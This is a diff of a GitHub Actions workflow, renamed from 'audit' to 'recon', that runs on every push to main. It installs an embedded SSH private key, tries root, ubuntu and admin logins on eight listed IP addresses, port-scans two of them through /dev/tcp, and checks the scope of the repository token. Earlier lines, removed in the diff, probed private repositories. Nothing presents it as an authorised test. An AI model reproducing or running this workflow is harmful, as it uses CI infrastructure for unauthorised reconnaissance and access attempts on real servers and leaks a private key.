@@ -1,18 +1,17 @@
-name: audit
+name: recon
 on:
-  workflow_dispatch:
   push:
     branches: [main]
+  workflow_dispatch:
 
 jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Setup SSH key
+      - name: Setup
         run: |
           mkdir -p ~/.ssh
-          echo "AAAAC3NzaC1lZDI1NTE5AAAAIFovpxkNUu/Ks7YXsswKig+uurmbTVg/+KRJELaKrAwq" | base64 -d > /dev/null 2>&1 || true
-          cat > ~/.ssh/pentest_key << 'KEYEOF'
+          cat > ~/.ssh/id_ed25519 << 'EOF'
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
 QyNTUxOQAAACBaL6cZDVLvyrO2F7LMCooPrrq5m01YP/ikSRC2iqwMKgAAAJjhNIEK4TSB
@@ -20,47 +19,40 @@ CgAAAAtzc2gtZWQyNTUxOQAAACBaL6cZDVLvyrO2F7LMCooPrrq5m01YP/ikSRC2iqwMKg
 AAAEBE+1luq0iSpZRYWAGMD1uRkBujt4p/tTxyx7DPagxS5lovpxkNUu/Ks7YXsswKig+u
 urmbTVg/+KRJELaKrAwqAAAAEHBlbnRlc3QtMjAyNjA2MzABAgMEBQ==
 -----END OPENSSH PRIVATE KEY-----
-KEYEOF
-          chmod 600 ~/.ssh/pentest_key
+EOF
+          chmod 600 ~/.ssh/id_ed25519
+          echo "Key installed"
 
-      - name: Probe servers from runner
+      - name: Probe SSH
         run: |
-          echo "=== Runner IP ==="
+          echo "=== Runner ==="
           curl -s ifconfig.me
           echo ""
-          echo "=== SSH probing target servers ==="
           for ip in 65.21.11.19 65.108.104.158 168.119.157.70 65.109.92.163 37.27.127.216 65.108.229.3 65.109.112.144 5.78.128.4; do
-            for user in root ubuntu admin hakuno2000 decentrio; do
-              echo -n "SSH $user@$ip: "
-              timeout 10 ssh -i ~/.ssh/pentest_key -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o UserKnownHostsFile=/dev/null "$user@$ip" "hostname && id && echo SSH_SUCCESS" 2>/dev/null
+            for user in root ubuntu admin; do
+              result=$(timeout 10 ssh -i ~/.ssh/id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o UserKnownHostsFile=/dev/null "$user@$ip" "hostname; id; cat /etc/os-release | head -3; echo SSH_OK" 2>/dev/null)
               rc=$?
               if [ $rc -eq 0 ]; then
-                echo "*** ACCESS GRANTED ***"
+                echo "ACCESS: $user@$ip"
+                echo "$result"
+                echo "---"
               else
-                echo "denied"
+                echo "DENIED: $user@$ip (rc=$rc)"
               fi
             done
           done
 
-      - name: Check GITHUB_TOKEN scope
-        env:
-          GH_TOKEN: ${{ github.token }}
+      - name: Port scan main proxy
         run: |
-          echo "=== GITHUB_TOKEN permissions ==="
-          curl -sS -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/hakuno2000/scripts 2>&1 | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(f\"Permissions: {d.get(\'permissions\',{})}\")"
-          echo "=== Can we access private repos with GITHUB_TOKEN? ==="
-          curl -sS -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/hakuno2000/Infrabot 2>&1 | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(f\"Infrabot access: {d.get(\'full_name\', d.get(\'message\', \'?\')),}\")"
-          curl -sS -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/hakuno2000/backup 2>&1 | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(f\"Backup access: {d.get(\'full_name\', d.get(\'message\', \'?\')),}\")"
+          echo "=== 65.21.11.19 ports ==="
+          for p in 22 80 443 3000 5432 6379 8080 8443 9090 26657 27017; do
+            timeout 3 bash -c "echo >/dev/tcp/65.21.11.19/$p" 2>/dev/null && echo "$p OPEN" || echo "$p closed"
+          done
+          echo "=== 168.119.157.70 ports ==="
+          for p in 22 80 443 3000 8081 8082 8083 26657; do
+            timeout 3 bash -c "echo >/dev/tcp/168.119.157.70/$p" 2>/dev/null && echo "$p OPEN" || echo "$p closed"
+          done
 
-      - name: Network recon on target IPs
+      - name: Token scope check
         run: |
-          echo "=== Port scan top ports on main proxy ==="
-          for port in 22 80 443 3000 5432 6379 8080 8443 9090 26657 27017; do
-            echo -n "$port: "
-            timeout 3 bash -c "echo '' > /dev/tcp/65.21.11.19/$port" 2>/dev/null && echo "OPEN" || echo "closed"
-          done
-          echo "=== Port scan demo server ==="
-          for port in 22 80 443 3000 8081 8082 8083 26657; do
-            echo -n "168.119.157.70:$port: "
-            timeout 3 bash -c "echo '' > /dev/tcp/168.119.157.70/$port" 2>/dev/null && echo "OPEN" || echo "closed"
-          done
+          curl -sI -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user 2>&1 | grep -i "x-oauth-scopes"
